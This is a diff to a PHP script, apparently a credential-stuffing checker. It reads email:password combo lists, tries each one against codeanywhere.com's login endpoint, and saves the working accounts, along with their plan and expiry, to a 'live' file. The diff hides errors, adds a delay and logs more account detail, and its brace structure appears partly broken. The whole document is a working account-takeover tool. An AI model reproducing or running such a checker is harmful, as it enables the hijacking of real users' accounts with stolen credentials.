@@ -1,5 +1,5 @@
 <?php
-
+error_reporting(0);
 echo "List Empas : ";
 $xyz = trim(fgets(STDIN));
 echo "\n";
@@ -17,18 +17,16 @@ $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gec
 $headers[] = 'Content-Type: application/x-www-form-urlencoded';
 $headers[] = 'Cookie: sid='.$sid.'; sails.sid='.$sails.'; _ga=GA1.2.515752818.1590008622; _gid=GA1.2.1441382021.1590008622; _gat=1';
 
-$gas = curl('https://codeanywhere.com/signin', 'login_email='.$email.'&login_password='.$passwd.'', $headers);
-if (strpos($gas[1], 'Invalid login')) {
-		console::log ("[Gagal] $email | $passwd", 'red');
-	} else {
-		$token = ($gas[2]['token']);
-	}
-}
-
 $headers1 = array();
 $headers1[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0';
 $headers1[] = 'Cookie: sid='.$sid.'; sails.sid='.$sails.'; _ga=GA1.2.515752818.1590008622; _gid=GA1.2.1441382021.1590008622; versioncode=41; token='.$token.'';
 
+$gas = curl('https://codeanywhere.com/signin', 'login_email='.$email.'&login_password='.$passwd.'', $headers);
+if (strpos($gas[1], 'Invalid login')) {
+		console::log ("[Gagal] $email | $passwd", 'red');
+		sleep(1);
+	} else {
+		$token = ($gas[2]['token']);
 $plan = curl('https://codeanywhere.com/editor', null, $headers1);
 
 $plan1 = curl('https://ca6.codeanywhere.com/api/v6/user/userData?token='.$token.'&rand=0.22768259447102934', null, null);
@@ -36,8 +34,12 @@ $plan1 = curl('https://ca6.codeanywhere.com/api/v6/user/userData?token='.$token.
 		$username = $json['username'];
 		$planname = $json['planname'];
 		$lastexpire = $json['last_subscription']['expire'];
+		$email = $json['email'];
 				console::log("[Success Login] $email | $passwd | Plan : $planname | Last Expire : $lastexpire", 'green');
-		fwrite(fopen("codeanywhere-live.txt", "a"), "$email | $passwd \n");
+		fwrite(fopen("codeanywhere-live.txt", "a"), "$email | $passwd | Plan : $planname | Last Expire : $lastexpire\n");
+	}
+}
+
 function curl($url,$post,$headers)
 {
 	$ch = curl_init();
